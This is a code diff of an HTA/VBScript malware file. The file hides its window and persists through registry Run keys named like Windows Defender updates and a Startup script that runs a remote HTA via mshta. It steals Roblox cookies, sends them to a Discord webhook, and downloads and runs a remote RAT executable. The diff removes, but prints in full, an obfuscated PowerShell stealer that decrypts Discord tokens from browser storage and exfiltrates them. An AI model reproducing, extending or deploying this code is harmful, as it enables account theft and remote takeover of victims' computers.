@@ -4,177 +4,42 @@
 <script language="VBScript">
 On Error Resume Next
 
-Dim sh, fso, WH, PC, USER, Q
+Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 WH   = "https://discordapp.com/api/webhooks/1556449542256197704/KXrJ2fykY1p4HlGGk5sYo-opjFomxo6OEjki9tkySBsmhZwSU-em0PN8Hvu0Iitp5ZZx"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
-Q    = Chr(34)
 
 Sub Window_OnLoad()
     window.resizeTo 0, 0
     window.moveTo -2000, -2000
     Call Persist
-    Call GrabDiscord
     Call GrabRoblox
     Call DropRAT
     window.setInterval "RegrabAll()", 300000
 End Sub
 
 Sub RegrabAll()
-    Call GrabDiscord
     Call GrabRoblox
 End Sub
 
-' ============================================================
-' PERSISTENCE
-' ============================================================
-
 Sub Persist()
     Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
+
+    ' Registry Run â€” fires on every login
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
+
+    ' Registry RunOnce â€” fires next login as backup
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+
+    ' Startup folder VBS â€” fires on every login
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
     sf.Close
     Set sf = Nothing
 End Sub
-
-' ============================================================
-' DISCORD TOKEN GRABBER
-' ============================================================
-
-Sub GrabDiscord()
-    Dim psPath: psPath = TmpFile("svc_net.ps1")
-    Dim f: Set f = fso.CreateTextFile(psPath, True, False)
-
-    f.WriteLine "Add-Type -AN System.Security"
-    f.WriteLine "$W='" & WH & "'"
-    f.WriteLine "$PC='" & PC & "'"
-    f.WriteLine "$US='" & USER & "'"
-    f.WriteLine "function Px($b){"
-    f.WriteLine "    try{"
-    f.WriteLine "        $by=[Text.Encoding]::UTF8.GetBytes($b)"
-    f.WriteLine "        $rq=[Net.WebRequest]::Create($W)"
-    f.WriteLine "        $rq.Method='POST';$rq.ContentType='application/json; charset=utf-8';$rq.ContentLength=$by.Length"
-    f.WriteLine "        $st=$rq.GetRequestStream();$st.Write($by,0,$by.Length);$st.Close()"
-    f.WriteLine "        $rq.GetResponse().Close()"
-    f.WriteLine "    }catch{}"
-    f.WriteLine "}"
-    f.WriteLine "function SE($t,$d,$c,$fl){"
-    f.WriteLine "    $e=@{title=$t;description=$d;color=$c;fields=$fl}"
-    f.WriteLine "    Px((@{embeds=@($e)}|ConvertTo-Json -Depth 6 -Compress))"
-    f.WriteLine "}"
-    f.WriteLine "function GK($bs){"
-    f.WriteLine "    try{"
-    f.WriteLine "        $ls=Join-Path $bs ('Loc'+'al S'+'tate')"
-    f.WriteLine "        if(!(Test-Path $ls)){return $null}"
-    f.WriteLine "        $jc=Get-Content $ls -Raw|ConvertFrom-Json"
-    f.WriteLine "        $ek=[Convert]::FromBase64String($jc.('os_'+'crypt').('encr'+'ypted_key'))"
-    f.WriteLine "        $ek=$ek[5..($ek.Length-1)]"
-    f.WriteLine "        $t='Curr'+'entUser'"
-    f.WriteLine "        return [Security.Cryptography.ProtectedData]::Unprotect($ek,$null,$t)"
-    f.WriteLine "    }catch{return $null}"
-    f.WriteLine "}"
-    f.WriteLine "function DT($enc,$key){"
-    f.WriteLine "    try{"
-    f.WriteLine "        if($enc.Length -lt 15){return $null}"
-    f.WriteLine "        $pfx=[Text.Encoding]::ASCII.GetString($enc[0..2])"
-    f.WriteLine "        if($pfx -ne 'v10' -and $pfx -ne 'v11'){return $null}"
-    f.WriteLine "        $iv=$enc[3..14]"
-    f.WriteLine "        $ct=$enc[15..($enc.Length-17)]"
-    f.WriteLine "        $tg=$enc[($enc.Length-16)..($enc.Length-1)]"
-    f.WriteLine "        $o=New-Object byte[] $ct.Length"
-    f.WriteLine "        $g=[System.Security.Cryptography.AesGcm]::new([byte[]]$key)"
-    f.WriteLine "        $g.Decrypt($iv,$ct,$tg,$o)"
-    f.WriteLine "        $g.Dispose()"
-    f.WriteLine "        return [Text.Encoding]::UTF8.GetString($o)"
-    f.WriteLine "    }catch{return $null}"
-    f.WriteLine "}"
-    f.WriteLine "function SL($path,$key){"
-    f.WriteLine "    $out=[Collections.Generic.HashSet[string]]::new()"
-    f.WriteLine "    if(!(Test-Path $path)){return $out}"
-    f.WriteLine "    $p1='dQw4'+'w9Wg'+'XcQ:[A-Za-z0-9+/=_-]+'"
-    f.WriteLine "    $p2='[\w-]{24}\.[\w-]{6}\.[\w-]{27,28}'"
-    f.WriteLine "    $p3='mfa\.[A-Za-z0-9_-]{84}'"
-    f.WriteLine "    Get-ChildItem $path -Include '*.ldb','*.log' -Recurse -EA 0|%{"
-    f.WriteLine "        try{"
-    f.WriteLine "            $txt=[Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($_.FullName))"
-    f.WriteLine "            [regex]::Matches($txt,$p1)|%{"
-    f.WriteLine "                if($key){try{"
-    f.WriteLine "                    $b64=$_.Value.Split(':',2)[1]"
-    f.WriteLine "                    $pad=(4-(($b64.Length)%4))%4;if($pad){$b64+='='*$pad}"
-    f.WriteLine "                    $d=DT([Convert]::FromBase64String($b64)) $key"
-    f.WriteLine "                    if($d -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'){$out.Add($d)|Out-Null}"
-    f.WriteLine "                }catch{}}"
-    f.WriteLine "            }"
-    f.WriteLine "            [regex]::Matches($txt,$p2)|%{$out.Add($_.Value)|Out-Null}"
-    f.WriteLine "            [regex]::Matches($txt,$p3)|%{$out.Add($_.Value)|Out-Null}"
-    f.WriteLine "        }catch{}"
-    f.WriteLine "    }"
-    f.WriteLine "    return $out"
-    f.WriteLine "}"
-    f.WriteLine "function VT($tok){"
-    f.WriteLine "    try{"
-    f.WriteLine "        $u='https://'+'disc'+'ord.com/api/v9/us'+'ers/@me'"
-    f.WriteLine "        $rq=[Net.WebRequest]::Create($u)"
-    f.WriteLine "        $rq.Method='GET';$rq.Timeout=8000;$rq.UserAgent='Mozilla/5.0'"
-    f.WriteLine "        $rq.Headers.Add(('Auth'+'oriza'+'tion'),$tok)"
-    f.WriteLine "        $j=(New-Object IO.StreamReader($rq.GetResponse().GetResponseStream())).ReadToEnd()|ConvertFrom-Json"
-    f.WriteLine "        $nt=@('None','Nitro Classic','Nitro','Nitro Basic')[[int]$j.premium_type]"
-    f.WriteLine "        return [PSCustomObject]@{T=$tok;U=$j.username;D=$j.discriminator;ID=$j.id;E=$j.email;Ph=$j.phone;M=$j.mfa_enabled;N=$nt}"
-    f.WriteLine "    }catch{return $null}"
-    f.WriteLine "}"
-    f.WriteLine "$ls1='Loc'+'al S'+'torage\level'+'db'"
-    f.WriteLine "$ls2='Default\Loc'+'al S'+'torage\level'+'db'"
-    f.WriteLine "$TGTS=[ordered]@{"
-    f.WriteLine "    'A'=""$env:APPDATA\Disc""+""ord"""
-    f.WriteLine "    'B'=""$env:APPDATA\disc""+""ordcanary"""
-    f.WriteLine "    'C'=""$env:APPDATA\disc""+""ordptb"""
-    f.WriteLine "    'D'=""$env:LOCALAPPDATA\Google\Chr""+""ome\User Data"""
-    f.WriteLine "    'E'=""$env:LOCALAPPDATA\Microsoft\Ed""+""ge\User Data"""
-    f.WriteLine "    'F'=""$env:LOCALAPPDATA\BraveSoftware\Brave-Br""+""owser\User Data"""
-    f.WriteLine "    'G'=""$env:APPDATA\Opera Software\Opera St""+""able"""
-    f.WriteLine "    'H'=""$env:APPDATA\Opera Software\Opera GX St""+""able"""
-    f.WriteLine "    'I'=""$env:LOCALAPPDATA\Vival""+""di\User Data"""
-    f.WriteLine "    'J'=""$env:LOCALAPPDATA\Yandex\YandexBr""+""owser\User Data"""
-    f.WriteLine "    'K'=""$env:LOCALAPPDATA\Tor""+""ch\User Data"""
-    f.WriteLine "    'L'=""$env:LOCALAPPDATA\Iridi""+""um\User Data"""
-    f.WriteLine "}"
-    f.WriteLine "$ALL=[Collections.Generic.HashSet[string]]::new()"
-    f.WriteLine "foreach($nm in $TGTS.Keys){"
-    f.WriteLine "    $bs=$TGTS[$nm];if(!(Test-Path $bs)){continue}"
-    f.WriteLine "    $k=GK $bs"
-    f.WriteLine "    SL (Join-Path $bs $ls2) $k|%{$ALL.Add($_)|Out-Null}"
-    f.WriteLine "    SL (Join-Path $bs $ls1) $k|%{$ALL.Add($_)|Out-Null}"
-    f.WriteLine "    Get-ChildItem $bs -Dir -EA 0|?{$_.Name -match '^Prof'+'ile'}|%{"
-    f.WriteLine "        SL (Join-Path $_.FullName $ls1) $k|%{$ALL.Add($_)|Out-Null}"
-    f.WriteLine "    }"
-    f.WriteLine "}"
-    f.WriteLine "$vl=@();foreach($t in $ALL){$x=VT $t;if($x){$vl+=$x}}"
-    f.WriteLine "foreach($r in $vl){"
-    f.WriteLine "    $inf=""**$($r.U)#$($r.D)** | ID: $($r.ID)`nEmail: $($r.E) | Phone: $($r.Ph) | MFA: $($r.M) | Nitro: $($r.N)"""
-    f.WriteLine "    $dc=""Token: $($r.T)"""
-    f.WriteLine "    $fl=@("
-    f.WriteLine "        @{name='Account';value=$inf},"
-    f.WriteLine "        @{name='Target';value=""PC: $PC | $US""}"
-    f.WriteLine "    )"
-    f.WriteLine "    SE 'Token' $dc 5814783 $fl"
-    f.WriteLine "}"
-    f.WriteLine "Remove-Item '" & psPath & "' -Force -EA 0"
-
-    f.Close
-    Set f = Nothing
-
-    Dim enc: enc = "po" & "wer" & "she" & "ll.exe"
-    Dim args: args = " -NoP -NonI -W Hi" & "dden -Ep By" & "pass -File " & Q & psPath & Q
-    sh.Run enc & args, 0, False
-End Sub
-' ============================================================
-' ROBLOX COOKIE — unchanged from your file
-' ============================================================
 
 Sub GrabRoblox()
     Dim paths(4)
@@ -230,10 +95,6 @@ Sub GrabRoblox()
     Call PostFile("cookie.txt", cookie)
 End Sub
 
-' ============================================================
-' RAT DROP — unchanged from your file
-' ============================================================
-
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
     Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"
@@ -248,10 +109,6 @@ Sub DropRAT()
         sh.Run Chr(34) & temp & Chr(34), 0, False
     End If
 End Sub
-
-' ============================================================
-' HELPERS — unchanged from your file
-' ============================================================
 
 Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
